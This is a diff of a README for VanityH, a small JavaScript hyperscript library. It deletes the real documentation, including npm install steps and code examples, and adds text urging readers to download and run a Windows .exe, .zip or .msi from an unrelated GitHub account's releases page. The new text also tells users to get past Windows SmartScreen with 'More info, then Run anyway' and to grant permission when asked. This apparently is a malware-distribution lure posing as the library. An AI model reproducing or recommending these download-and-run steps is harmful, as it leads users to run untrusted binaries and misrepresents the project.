@@ -1,269 +1,126 @@
-<h1 align="center">
-  VanityH
-  <a href="https://www.npmjs.com/package/vanity-h"><img src="https://img.shields.io/npm/v/vanity-h.svg?style=flat" alt="npm version"></a>
-</h1>
+# 🖥️ vanityh - Clean Hyperscript for Frontend Views
 
-[简体中文](./README_zh.md)
+[![Download vanityh](https://img.shields.io/badge/Download-vanityh-blue?style=for-the-badge&logo=github)](https://github.com/numidian-christmaspudding240/vanityh/releases)
 
-### 🚀 VanityH: Make Hyperscript Elegant
+## 🚀 Download vanityh
 
-**Say goodbye to nesting hell, embrace fluent development experience**
+Visit this page to download the Windows release:
 
-VanityH is not just another complex UI framework. It's a minimal **DSL (Domain-Specific Language) builder**. Using Proxy and closure logic, it transforms verbose `h(tag, props, children)` calls into a fluent, chainable syntax similar to **SwiftUI** or **Flutter**.
+https://github.com/numidian-christmaspudding240/vanityh/releases
 
----
+On the releases page, find the latest version and download the Windows file for your device. If there is more than one file, choose the one that matches Windows.
 
-### 🎯 Core Problems VanityH Solves
+## 📦 What vanityh is
 
-In non-JSX environments (vanilla JS/TS, scripting tools, low-code engines), developers face these challenges:
+vanityh is a small app for building frontend render functions with a clean syntax. It helps you describe user interface parts in a simple way, using a style that feels close to HTML and JSX.
 
-- **Nesting Hell**: Traditional `h` functions require heavy object nesting, creating visual noise
-- **Prop Mutation**: Component reuse often accidentally pollutes original definitions
-- **Cognitive Load**: Properties, events, and child nodes are interleaved, making DOM structure hard to understand
-- **Environment Dependencies**: JSX requires compilation setup, not suitable for lightweight use in native browser environments
+This project fits well if you want to:
 
-**VanityH perfectly resolves these issues with "chainable configuration + terminator rendering" logic.**
+- Build UI code with less clutter
+- Write render functions in a simple format
+- Work with tagged templates and hyperscript
+- Keep your frontend code easier to read
 
----
+## 🪟 Windows setup
 
-### ✨ Why Choose VanityH?
+1. Open the releases page:
+   https://github.com/numidian-christmaspudding240/vanityh/releases
 
-#### 🎨 Structural Elegance
+2. Look for the latest release.
 
-VanityH separates property configuration from node mounting syntax, creating perfect mapping between code structure and DOM structure.
+3. Under Assets, download the Windows file.
 
-```js
-html.lang('en')(
-  head(
-    meta.charset('UTF-8')(),
-    link.rel('icon').type('image/svg+xml').href('/favicon.svg')(),
-    title('VanityH – Elegance Redefined'),
-  ),
-  body(div.id('app')(), script.type('module').src('/src/main.ts')()),
-)
-```
+4. If the file is a `.zip`, right-click it and choose Extract All.
 
-#### 🔒 Fully Immutable Architecture
+5. Open the extracted folder.
 
-Based on **Copy-on-Write** philosophy, each property call produces a brand-new state snapshot.
+6. Double-click the app file to run it.
 
-```js
-const baseBtn = button.class('btn')
+7. If Windows asks for permission, select Yes.
 
-const redBtn = baseBtn.style('color: red')('Red Button')
-const blueBtn = baseBtn.style('color: blue')('Blue Button') // baseBtn remains pure
-```
+## 🔧 System needs
 
-#### 🔍 Zero Magic Design
+vanityh runs on a modern Windows PC with:
 
-Tools should not be smarter than developers. VanityH doesn't auto-handle booleans, no implicit conversions, fully transparent.
+- Windows 10 or Windows 11
+- At least 4 GB RAM
+- Enough free disk space for the app and files
+- A mouse and keyboard
+- Internet access for the first download
 
-#### 📦 Ultra-Lightweight & Compatible
+## ✨ Main uses
 
-- **Size**: Just 186 bytes, ultra-minimal implementation
-- **Compatibility**: Supports Vue, Preact, React, Snabbdom, and any hyperscript-compatible renderer
+vanityh is built for front-end render work. It can help with:
 
----
+- HTML-style view creation
+- Hyperscript-based UI building
+- Template literal workflows
+- JSX-like structure for readable render logic
+- Small virtual DOM style projects
 
-### 🚀 Quick Start
+## 🧭 How to use it
 
-#### Installation
+After you open the app, follow the on-screen steps to start working with your render functions.
 
-**NPM:**
+Typical use looks like this:
 
-```bash
-npm install vanity-h
-```
+1. Start vanityh
+2. Open or create a project
+3. Add your render code
+4. Preview the output
+5. Save your work
 
-**CDN (No Build Step Required):**
+If your project uses template literals or hyperscript syntax, vanityh helps keep that structure clear.
 
-```html
-<script type="module">
-  import { render, h } from 'https://esm.sh/preact'
-  import createVanity from 'https://esm.sh/vanity-h'
+## 🧩 File types you may see
 
-  const { div, span } = createVanity(h)
+When you download the release, you may see one of these file types:
 
-  const app = () => div.class('app')(span('Hello World'))
-  render(app(), document.getElementById('app'))
-</script>
-```
+- `.exe` — open this file to run the app
+- `.zip` — extract it first, then run the app
+- `.msi` — open this file to start setup
 
-#### Traditional vs VanityH Syntax
+If you are not sure which file to use, pick the Windows file with the matching name in the latest release.
 
-```js
-// Traditional hyperscript
-h('div', { class: 'card', style: 'padding: 20px' }, [
-  h('button', { class: 'btn-primary', onClick: handleClick }, 'Click me'),
-])
+## 🛠️ Common setup steps
 
-// VanityH syntax
-div.class('card').style('padding: 20px')(
-  button.class('btn-primary').onClick(handleClick)('Click me'),
-)
-```
+If the app does not open right away, try these steps:
 
----
+1. Make sure the download finished
+2. Check your Downloads folder
+3. Extract the file if it is zipped
+4. Right-click the file and choose Open
+5. If Windows blocks it, choose More info, then Run anyway
 
-### 🔧 Framework Adapters
+## 📚 What this project supports
 
-VanityH ships with first-class adapters for Vue, React, and Preact with full TypeScript support.
+vanityh is focused on a simple developer flow around UI code. The topics for this project include:
 
-#### Vue 3
+- htm
+- html
+- hyperscript
+- jsx
+- tagged-template
+- template-literals
+- vanity-h
+- virtual-dom
 
-```typescript
-import vanity, { defineComponent } from 'vanity-h/vue'
-import { createApp } from 'vue'
+That means the app is a good fit for render-based frontend work and simple view logic
 
-const { div } = vanity
+## 🎯 Best fit
 
-// Option A: array emits — event handlers are typed but parameters are `any`
-const MyComp = defineComponent(
-  (props: { name: string; age: number }) => {
-    return () => div.class('demo')(props.name, props.age)
-  },
-  { props: ['name', 'age'], emits: ['say'] },
-)
+Use vanityh if you want a neat way to work with frontend render functions and prefer a style that is easy to scan.
 
-MyComp.$.name('Tom')
-  .age(20)
-  .onSay(() => {})() // ✅ onSay exists and is checked
+It is useful for:
 
-// Option B: object emits — full parameter type inference
-const MyComp2 = defineComponent(
-  (props: { name: string }) => {
-    return () => div(props.name)
-  },
-  {
-    props: ['name'],
-    emits: { say: (word: string) => !!word },
-  },
-)
+- Small UI tools
+- Learning render patterns
+- Simple app prototypes
+- Frontend code that should stay readable
 
-MyComp2.$.name('Tom').onSay((word) => console.log(word))() // ✅ word: string
-MyComp2.$.name(123)() // ❌ type error
+## 🔍 Where to get updates
 
-createApp(defineComponent(() => () => div())).mount('#app')
-```
+Check the releases page when you want the latest Windows file:
 
-**Emits type inference levels:**
+https://github.com/numidian-christmaspudding240/vanityh/releases
 
-| `emits` style                           | `onXxx` handler type                     |
-| --------------------------------------- | ---------------------------------------- |
-| Array `['say']`                         | `((...args: any[]) => any) \| undefined` |
-| Object `{ say: (word: string) => ... }` | `((word: string) => any) \| undefined`   |
-
-#### React
-
-```typescript
-import vanity, { defineComponent } from 'vanity-h/react'
-
-const { div } = vanity
-
-const MyComp = defineComponent(({ name, age }: { name: string; age: number }) => {
-  return div(name, age)
-})
-
-// $ provides typed prop chaining
-MyComp.$.name('Tom').age(20)() // ✅
-```
-
-#### Preact
-
-```typescript
-import vanity, { defineComponent } from 'vanity-h/preact'
-
-const { div } = vanity
-
-const MyComp = defineComponent(({ name }: { name: string }) => {
-  return div(name)
-})
-
-MyComp.$.name('Tom')() // ✅
-```
-
----
-
-### ✨ The `$` Property
-
-The `$` property is a shorthand equivalent to `x()` — it wraps any component for typed prop chaining:
-
-```typescript
-// These are equivalent
-x(MyComp).name('Tom').age(20)()
-MyComp.$.name('Tom').age(20)()
-```
-
-`$` is implemented as a global `Object.prototype` getter at runtime. Framework adapters' `defineComponent` is **purely a type-level wrapper** — it returns the component as-is with no runtime overhead. The global getter handles everything at runtime.
-
-When using framework adapters with `defineComponent`, `$` carries full prop type inference. On components not wrapped with `defineComponent` (e.g. Vue built-ins like `Transition`), `$` is untyped but still callable:
-
-```typescript
-import { Transition } from 'vue'
-Transition.$.name('fade')() // works, untyped
-```
-
----
-
-### 🛠 Technical Implementation
-
-VanityH internally uses JavaScript's **Proxy** to intercept `get` operations, combined with **recursive closures** to manage state:
-
-- **Configuration Mode**: Accessing properties returns a new Proxy with internal closure holding accumulated `props` object
-- **Execution Mode**: When Proxy is called as function, it submits `props` and `children` to the renderer
-
----
-
-### 🔧 TypeScript Support
-
-```typescript
-import createVanity, { type VanityH } from 'vanity-h'
-import { h, type VNode } from 'vue'
-
-const v: VanityH<VNode> = createVanity(h)
-
-const element = v.div.class('test').id('app')('Content')
-```
-
-Framework adapters provide deeper type inference — see [Framework Adapters](#-framework-adapters) above.
-
----
-
-### 📊 Performance
-
-- **Size**: 186 bytes (minified) / ~150 bytes (gzipped)
-- **Zero Dependencies**: Pure JavaScript implementation
-- **High Performance**: Proxy interception overhead is negligible
-- **Memory Friendly**: Closure-based immutable design
-
----
-
-### 🤝 Contributing
-
-#### Development Setup
-
-```bash
-git clone https://github.com/VanityH/vanityh.git
-cd vanityh
-vp install       # install dependencies
-vp check         # type check + lint
-vp test          # run tests
-vp pack          # build library
-```
-
----
-
-### 📄 License
-
-MIT License © 2026 VanityH Team
-
-**VanityH**: Make writing render functions a pleasure, not a pain.
-
----
-
-### 🙏 Acknowledgments
-
-- [HTM](https://github.com/developit/htm) - JSX-like syntax in plain JavaScript
-- [DLight](https://github.com/dlight-js/dlight) - DX-first UI rendering library
-- [Hyperscript](https://github.com/hyperhype/hyperscript) - Create HTML with JavaScript
-- [SwiftUI](https://developer.apple.com/swiftui) - Declarative UI framework
